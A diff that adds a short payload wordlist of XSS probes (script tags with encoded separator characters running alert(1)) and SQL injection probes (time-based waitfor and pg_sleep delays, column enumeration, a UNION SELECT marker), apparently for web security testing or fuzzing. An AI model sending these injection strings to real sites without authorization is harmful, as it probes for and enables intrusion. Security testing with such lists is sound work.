@@ -1,0 +1,17 @@
+XSS:
+<script>alert(1)</script>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+
+SQL Injection:
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+1' GROUP BY 1,2,3--+
+1' ORDER BY 3--+
+") or pg_sleep(5)--
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
